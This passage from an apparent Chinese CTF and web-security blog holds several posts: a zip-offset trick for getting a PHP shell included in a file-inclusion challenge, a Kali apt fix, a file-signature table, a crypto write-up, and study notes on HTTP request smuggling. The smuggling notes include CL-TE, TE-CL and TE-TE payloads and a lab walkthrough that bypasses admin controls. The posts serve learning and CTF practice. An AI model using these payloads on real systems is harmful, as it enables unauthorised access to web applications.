<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145936187.png" alt="image-20221106145936187"></p>
<p>所以file_list得到的也是空值，在执行删除目录或者文件的时候便不会删除到0文件夹下的内容。</p>
<h2 id="利用姿势three目录穿越"><a class="markdownIt-Anchor" href="#利用姿势three目录穿越"></a> 利用姿势Three–目录穿越</h2>
<h3 id="软连接"><a class="markdownIt-Anchor" href="#软连接"></a> 软连接</h3>
<p>目前遇到的赛题MT-CTF初赛  ，由于没找到环境现在打一下，就着比赛时候的writeup说一下</p>
<p>先说一下软连接</p>
<blockquote>
<p>软连接是linux中一个常用命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。</p>
<p>具体用法是：ln -s 源文件 目标文件。</p>
<p>当 我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在其它的 目录下用ln命令链接（link）就可以，不必重复的占用磁盘空间</p>
</blockquote>
<p><a href="..........%5C%E6%A1%8C%E9%9D%A2%5CCTF%5CMT_CTF%5CMT-CTF%E5%86%B3%E8%B5%9B-Writeup.pdf">MT-CTF决赛-Writeup.pdf</a></p>
<h2 id="利用姿势four文件包含"><a class="markdownIt-Anchor" href="#利用姿势four文件包含"></a> 利用姿势Four–文件包含</h2>
<h2 id="inephp-0ctf2021"><a class="markdownIt-Anchor" href="#inephp-0ctf2021"></a> inephp - 0ctf2021</h2>
<p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021/1linephp">这个题目</a>取自非常经典的文件包含题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">(<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;yxxx&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>) &amp;&amp; @<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;@&lt;?php&#x27;</span> ? <span class="keyword">include</span>(<span class="variable">$_</span>) : <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) &amp;&amp; <span class="keyword">include</span>(<span class="string">&#x27;phpinfo.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这里限制后缀必须是<code>.php</code>的文件才能够实现包含。这里可以利用zip来构成条件竞争来上传。</p>
<p>这里需要传一个构造过的zip包，然后令<code>yxxx=zip:///tmp/sess_evil#1</code>这样，让后续的代码能够include它。但显然通过<em>session.upload_progress</em>搞上去的文件最开始的字符串内容是<code>upload_progress_</code>，所以必须想办法绕过<code>@substr(file($_)[0],0,6) === '@&lt;?php'</code>的判断。</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" alt="1.png"></p>
<p>根据<a href="https://github.com/corkami/collisions#zip">上图</a>，我们不难发现<code>End of Central Directory</code>(中央目录结束)里面有一个<code>offset of start of central</code>(中心起点的偏移量)，左下的示意图说明程序处理zip文件的时候首先从这个文件末尾出发，根据偏移找到Central Directory<code>(中央目录)的头位置，然后再根据</code>relative offset of local header<code>(本地头的相对偏移量)找到整个zip文件头的位置，也就指向</code>local file header signature`(本地文件头签名)</p>
<p><strong>zip构造</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip shell.zip 1.php</span><br><span class="line">echo -n &quot;upload_progress_&quot; &gt; f</span><br><span class="line">cat f shell.zip &gt; b.zip</span><br><span class="line">zip -F b.zip --out c.zip</span><br></pre></td></tr></table></figure>
<p>这里的解决办法就是修改这两个offset，这样zip协议能够跳开前面几个字符找到正确的位置。另外，CRC的值我们也不必进行修改，因为<a href="https://stackoverflow.com/questions/63647618/how-to-validate-crc-32-calculation-of-zip-file">这里的crc-32其实是根据crc前面的相关信息计算出来的结果</a>。因为最开始的字符串内容是<code>upload_progress_</code>，其长度为16，因此这两个offset（从010editor来看就是<code>elDirectoryOffset</code>(el目录偏移量)和<code>deHeaderOffset</code>(de标头偏移量)）都要加上16。</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106185559363.png" alt="image-20221106185559363"></p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106184440246.png" alt="image-20221106184440246"></p>
]]></content>
      <categories>
        <category>技术分享复现</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title>kali升级报错没有 Release 文件</title>
    <url>/2022/09/kail%E5%8D%87%E7%BA%A7%E6%8A%A5%E9%94%99%EF%BC%9AE%20%E4%BB%93%E5%BA%93%20%E2%80%9Chttpsdownload.docker.comlinuxdebian%20kali-rolling%20Release%E2%80%9D%20%E6%B2%A1%E6%9C%89%20Release%20%E6%96%87%E4%BB%B6%E3%80%82/</url>
    <content><![CDATA[<p>写在前面，这是我在使用kali的过程中遇到的问题</p>
<span id="more"></span>
<h4 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@root:~# sudo apt update 命中:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease 忽略:2 https://download.docker.com/linux/debian kali-rolling InRelease 错误:3 https://download.docker.com/linux/debian kali-rolling Release  404  Not Found [IP: 65.8.85.83 443] 正在读取软件包列表... 完成 E: 仓库 “https://download.docker.com/linux/debian kali-rolling Release” 没有 Release 文件。 N: 无法安全地用该源进行更新，所以默认禁用该源。 N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。</span><br></pre></td></tr></table></figure>
<h4 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@root:~# cd /etc/apt/sources.list.d</span><br><span class="line">root@root:/etc/apt/sources.list.d# ls</span><br><span class="line">docker.list</span><br><span class="line">root@root:/etc/apt/sources.list.d# rm docker.list </span><br><span class="line">root@root:/etc/apt/sources.list.d# apt-get update &amp;&amp; apt-get upgrade</span><br></pre></td></tr></table></figure>
<p>好耶散花！QWQ</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>文件头标准编码</title>
    <url>/2022/11/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%87%E5%87%86%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<p>一些礼物</p>
<span id="more"></span>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF</span><br><span class="line">PNG (png)，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0a</span><br><span class="line">GIF (gif)，文件头：47 49 46 38</span><br><span class="line">Windows Bitmap (bmp)，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">python反编译文件pyc的头：03 F3 0D 0A  </span><br><span class="line">pyd的文件头：4D 5A 90 00</span><br><span class="line">ZIP Archive (zip)，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件</span><br><span class="line">doc文件rar文件: 52 61 72 21</span><br><span class="line">7z文件头：37 7A BC AF 27 1C</span><br><span class="line">MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</span><br><span class="line">CAD (dwg)，文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，文件头：7B5C727466</span><br><span class="line">XML (xml)，文件头：3C3F786D6C</span><br><span class="line">HTML (html)，文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，文件头：2142444E</span><br><span class="line">MS Access (mdb)，文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，文件头：FF575043</span><br><span class="line">Postscript (eps.or.ps)，文件头：252150532D41646F6265</span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，文件头：E3828596</span><br><span class="line">RAR Archive (rar)，文件头：52617221</span><br><span class="line">Wave (wav)，文件头：57415645</span><br><span class="line">AVI (avi)，文件头：41564920</span><br><span class="line">Real Audio (ram)，文件头：2E7261FD</span><br><span class="line">Real Media (rm)，文件头：2E524D46</span><br><span class="line">MPEG (mpg)，文件头：000001BA</span><br><span class="line">MPEG (mpg)，文件头：000001B3</span><br><span class="line">Quicktime (mov)，文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，文件头：4D546864</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>网鼎杯青龙组初赛复现Writeup</title>
    <url>/2022/09/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0Writeup/</url>
    <content><![CDATA[<p>​    这场比赛，在赛中及其坐牢，自己一直学的Web没派上什么用场，还是积蓄不够，倒是密码很有意思，赛后主要复现Crypto去了。qwq</p>
<span id="more"></span>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
<h2 id="crypto091"><a class="markdownIt-Anchor" href="#crypto091"></a> crypto091</h2>
<p>根据题意，猜测一波sha256，上脚本爆破，赛后有好友说可以用hashcat，自己没弄出来，还是安心写脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="built_in">hash</span> = <span class="string">&#x27;c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;86170&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>*<span class="number">8</span>)://<span class="number">0</span>-<span class="number">9</span>十位数填充八位，所以循环<span class="number">10</span>*<span class="number">8</span>次</span><br><span class="line">    phone_number = m + <span class="built_in">str</span>(i).zfill(<span class="number">8</span>)//匹配爆破的数</span><br><span class="line">    <span class="keyword">if</span> sha256(phone_number.encode()).hexdigest() == <span class="built_in">hash</span>:</span><br><span class="line">        //匹配填充后的电话号码<span class="built_in">hash</span>值</span><br><span class="line">        <span class="built_in">print</span>(phone_number)</span><br><span class="line">‘‘‘</span><br><span class="line"><span class="number">8617091733716</span></span><br><span class="line">’’’</span><br></pre></td></tr></table></figure>
<h2 id="crypto405"><a class="markdownIt-Anchor" href="#crypto405"></a> crypto405</h2>
<p>先看题目给的out.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Grasshopper#00:2066</span><br><span class="line">Grasshopper#01:a222</span><br><span class="line">Grasshopper#02:cbb1</span><br><span class="line">Grasshopper#03:dbb4</span><br><span class="line">Grasshopper#04:deb4</span><br><span class="line">Grasshopper#05:b1c5</span><br><span class="line">Grasshopper#06:33a4</span><br><span class="line">Grasshopper#07:c051</span><br><span class="line">Grasshopper#08:3b79</span><br><span class="line">Grasshopper#09:6bf8</span><br><span class="line">Grasshopper#10:2131</span><br><span class="line">Grasshopper#11:2c40</span><br><span class="line">Grasshopper#12:91ba</span><br><span class="line">Grasshopper#13:7b44</span><br><span class="line">Grasshopper#14:5f25</span><br><span class="line">Grasshopper#15:0208</span><br><span class="line">Grasshopper#16:7edb</span><br><span class="line">Grasshopper#17:62b5</span><br><span class="line">Grasshopper#18:cec5</span><br><span class="line">Grasshopper#19:5ab3</span><br><span class="line">Grasshopper#20:3c46</span><br><span class="line">Grasshopper#21:c272</span><br><span class="line">Grasshopper#22:714b</span><br><span class="line">Grasshopper#23:9e0b</span><br><span class="line">Grasshopper#24:48ee</span><br><span class="line">Grasshopper#25:44cc</span><br><span class="line">Grasshopper#26:05a0</span><br><span class="line">Grasshopper#27:3da3</span><br><span class="line">Grasshopper#28:11b1</span><br><span class="line">Grasshopper#29:259f</span><br><span class="line">Grasshopper#30:899d</span><br><span class="line">Grasshopper#31:a130</span><br><span class="line">Grasshopper#32:e58f</span><br><span class="line">Grasshopper#33:23f3</span><br><span class="line">Grasshopper#34:5829</span><br><span class="line">Grasshopper#35:6beb</span><br><span class="line">Grasshopper#36:3681</span><br><span class="line">Grasshopper#37:0054</span><br><span class="line">Grasshopper#38:a189</span><br><span class="line">Grasshopper#39:2765</span><br><span class="line">Grasshopper#40:c63d</span><br><span class="line">Grasshopper#41:bc68</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP请求走私</title>
    <url>/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    <content><![CDATA[<p>这是一些关于HTTP请求走私的一些学习笔记和总结，也有一些借鉴，Copy啦！QwQ~<code>====</code></p>
<span id="more"></span>
<h1 id="浅谈http请求走私"><a class="markdownIt-Anchor" href="#浅谈http请求走私"></a> 浅谈HTTP请求走私</h1>
<hr>
<p>​                                                                                                                                                        <strong>--------------TWe1v3</strong></p>
<p>本文主要针对HTTP/1.1协议的请求走私做一些讲解，不涉及HTTP/2.0、HTTP/3.0的相关技术。不过这里可以说一下HTTP和HTTPS的一些差别：</p>
<blockquote>
<p><strong>HTTP与HTTPS不同</strong></p>
<ul>
<li>HTTPS需要CA（Certificate Authority，数字证书认证机构） 申请证书，免费的很少</li>
<li>HTTP默认80端口；HTTPS默认443端口</li>
<li>HTTP使用http标识符；HTTPS使用https标识符</li>
<li>HTTP是明文传输；HTTPS是加密传输</li>
<li>HTTP响应比HTTPS快，因为HTTPS还需要TSL握手，所以HTTPS更耗费服务器资源</li>
</ul>
</blockquote>
<h2 id="产生原因"><a class="markdownIt-Anchor" href="#产生原因"></a> 产生原因</h2>
<p>当今的 Web 应用程序经常在用户和最终应用程序逻辑之间采用 HTTP 服务器链。用户将请求发送到 前端服务器（有时称为负载平衡器或反向代理），此服务器将请求转发到一个或多个后端服务器。 这种类型的架构在现代基于云的应用程序中越来越普遍，在某些情况下是不可避免的。</p>
<p>当前端服务器将 HTTP 请求转发到后端服务器时，它通常会通过同一后端网络发送多个请求 连接，因为这更加高效和高性能。协议非常简单：HTTP请求一个接一个地发送，并且 接收服务器解析 HTTP 请求标头，以确定一个请求的结束位置和下一个请求的开始位置：</p>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126132239777.png" alt="image-20221126132239777"></p>
<p><strong>原因</strong>:当网站使用两个服务器（一个前端，一个后端）来处理用户所提交的数据，而两个服务器之间对HTTP header的处理不一致，就可能产生HTTP走私问题。</p>
<blockquote>
<p>现在的Web应用程序经常在用户和最终的应用程序之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理，也可能是WAF），并且该服务器将请求转发到一个或多个后端服务器。</p>
</blockquote>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126132324467.png" alt="image-20221126132324467"></p>
<h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h2>
<h3 id="http11的特性"><a class="markdownIt-Anchor" href="#http11的特性"></a> HTTP/1.1的特性</h3>
<h4 id="keep-alive"><a class="markdownIt-Anchor" href="#keep-alive"></a> Keep-Alive</h4>
<p>Keep-Alive（又称持久连接），在<code>HTTP/1.1</code>中，默认使用启用Keep-Alive，Keep-Alive功能使客户端到服务器端的连接持续有效，同一对客户/服务器之间的后续请求和响应可以通过这个连接发送。</p>
<h4 id="支持pipeline"><a class="markdownIt-Anchor" href="#支持pipeline"></a> 支持pipeline</h4>
<p><code>HTTP/1.1</code>允许在持久连接上可选地使用请求管道（意味pipeline是依赖于持久连接的，而不是独立的）。pipeline请求管道可以在响应到达之前，将多条请求放入队列，但对于pipeline的请求顺序和响应顺序是相对应的。</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721172714.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721172714-166930312604254.png" alt="img"></a></p>
<h3 id="对于keep-alive模式如何判断请求所得到的响应数据已经接收完成"><a class="markdownIt-Anchor" href="#对于keep-alive模式如何判断请求所得到的响应数据已经接收完成"></a> 对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成</h3>
<h4 id="conent-length"><a class="markdownIt-Anchor" href="#conent-length"></a> Conent-Length</h4>
<p>Conent-Length表示实体内容长度，当客户端向服务器请求一个静态页面或者一张图片时，服务器可以很清楚的知道内容大小，然后通过Content-length消息首部字段告诉客户端 需要接收多少数据。</p>
<h4 id="transfer-encoding"><a class="markdownIt-Anchor" href="#transfer-encoding"></a> Transfer-Encoding</h4>
<p>分块编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。</p>
<h3 id="分块编码transfer-encoding-chunked"><a class="markdownIt-Anchor" href="#分块编码transfer-encoding-chunked"></a> 分块编码（Transfer-Encoding: chunked）</h3>
<ol>
<li>在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。</li>
<li>每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF(\r\n)，也不包括分块数据结尾的 CRLF(\r\n)。</li>
<li>最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</li>
</ol>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25\r\n</span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line">1C\r\n</span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line">3\r\n</span><br><span class="line">con\r\n</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<h2 id="几种走私类型"><a class="markdownIt-Anchor" href="#几种走私类型"></a> 几种走私类型</h2>
<h3 id="cl-te"><a class="markdownIt-Anchor" href="#cl-te"></a> CL-TE</h3>
<p>前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。</p>
<p>发送两次请求，当第二次请求时出现HTTP方式错误，则存在走私问题。实验截图：</p>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126110216153.png" alt="image-20221126110216153"></p>
<p>原因就是第一次前端服务器解析时，使用Content-Length头判断结束，所以传给后端服务器的数据为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
<p>总共加起来为6，而后端服务器以 Transfer-Encoding: chunked 判断结束，当遇到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>在分块传输中，则代表结束，而后面的 <code>G</code> ，服务器判断未完成的请求，将遗留在缓存中，所以当第二次请求时，接在了 <code>G</code> 的后面，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Host:  0a10004c04fa2400c0c96f4b00440076.web-security-academy.net</span><br><span class="line">Connection: close</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这就完成了一次成功的请求走私<br>
在实际情况中是不会出现HTTP请求方式错误的，可以通过<strong>时间延迟</strong>来判断是否存在CL-TE类型的走私问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
<p>如果存在走私问题，下一个请求就会有明显的延迟。</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721193923.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721193923.png" alt="img"></a></p>
<p>或者使用下面的payload进行验证，如果存在走私问题，则会<strong>返回错误</strong>的页面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721193726.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721193726.png" alt="img"></a></p>
<ul>
<li>注意<br>
由于前端服务器处理Content-Length，需要把我们所有的内容都发送到后端服务器中去，那这个Content-Length可以用Brupsuite自动计算。</li>
</ul>
<h3 id="te-cl"><a class="markdownIt-Anchor" href="#te-cl"></a> TE-CL</h3>
<p>前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</p>
<p>简单判断payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>时间延迟payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
<p>响应差异payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">34</span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">a=BADHGSGSG</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<ul>
<li>注意<br>
需要注意的是走私的请求中，Content-Length一定要少于后面请求中的长度，否则后台会Timeout出现错误。</li>
</ul>
<h3 id="te-te"><a class="markdownIt-Anchor" href="#te-te"></a> TE-TE</h3>
<p>前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式混淆标头来诱导其中一台服务器不对其进行处理。</p>
<p>混淆的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
<p>简单判断payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac261f3a1eb0e24580730eed00d70071.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721203309.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721203309.png" alt="img"></a></p>
<h2 id="利用http请求走私漏洞"><a class="markdownIt-Anchor" href="#利用http请求走私漏洞"></a> 利用HTTP请求走私漏洞</h2>
<h3 id="bypass前端服务器安全验证"><a class="markdownIt-Anchor" href="#bypass前端服务器安全验证"></a> Bypass前端服务器安全验证</h3>
<p><strong>场景</strong>：前端服务器对某些页面添加了访问限制，比如实验中对admin页面控制在只能是后端服务器才能访问，此时可以通过HTTP走私漏洞来绕过这个限制。</p>
<ul>
<li>CL-TE</li>
</ul>
<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p>发送两次请求，响应消息反馈不允许重复header</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721213930.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721213930.png" alt="img"></a></p>
<p>于是，加个传输字符数限制，将走私后面的请求去掉，即可访问/admin界面了</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221139.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221139.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221407.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221407.png" alt="img"></a></p>
<p>完成删除用户</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221816.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221816.png" alt="img"></a></p>
<ul>
<li>TE-CL</li>
</ul>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721223313.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721223313.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721223504.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721223504.png" alt="img"></a></p>
<h3 id="获取前端服务器对请求的重写情况"><a class="markdownIt-Anchor" href="#获取前端服务器对请求的重写情况"></a> 获取前端服务器对请求的重写情况</h3>
<p><strong>场景</strong>：前端服务器通常在请求添加到其他请求头之前，先对请求进行一些重写，然后再转发给后端服务器。一般是添加一些HTTP HEADER。可以通过HTTP走私请求来获取到这些重写内容。</p>
<p>但走私的前提需具备一些条件：</p>
<ul>
<li>存在一个POST请求，传入参数会储存并可以被查看</li>
<li>存在HTTP走私请求</li>
</ul>
<p>构造一个chunk，包含一个完整的post请求，把可以储存的参数放在最后。当第二个请求传递时，则会把HTTP HEADER添加在参数后面而被存储。就可以获取到前端服务器所添加的HTTP HEADER。这里需要注意Content-Length不能超过所传递数据包的长度，不然会导致请求失败</p>
<p>尝试走私请求直接访问/admin，却返回响应信息只有管理员登陆或者从127.0.0.1请求才可以访问</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724145918.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724145918.png" alt="img"></a></p>
<p>页面上有个搜索框，输入任意内容，会在页面上返回出来</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724150746.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724150746.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724150855.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724150855.png" alt="img"></a></p>
<p>于是利用这个搜索参数，将前端服务器重写请求的情况展示出来，发现了 X-trnzSu-Ip 请求头</p>
